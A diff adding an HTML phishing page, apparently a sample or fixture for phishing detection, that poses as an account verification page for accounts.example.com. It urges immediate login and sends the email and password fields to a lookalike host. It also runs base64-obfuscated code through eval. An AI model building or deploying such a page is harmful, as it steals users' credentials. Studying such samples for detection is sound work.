@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="origin-domain" content="accounts.example.com" />
+    <title>Account Verification</title>
+    <script>
+      const payload = eval(atob("YWxlcnQoJ1VwZGF0ZSB5b3VyIGFjY291bnQnKTs="));
+    </script>
+  </head>
+  <body>
+    <!-- origin-domain: accounts.example.com -->
+    <h1>Verify your account</h1>
+    <p>Your security update requires immediate login with your password.</p>
+    <form method="post" action="https://login.example-security-support.com/session">
+      <input type="hidden" name="token" value="123" />
+      <label>
+        Email
+        <input type="email" name="email" />
+      </label>
+      <label>
+        Password
+        <input type="password" name="password" />
+      </label>
+      <button type="submit">Sign in</button>
+    </form>
+  </body>
+</html>
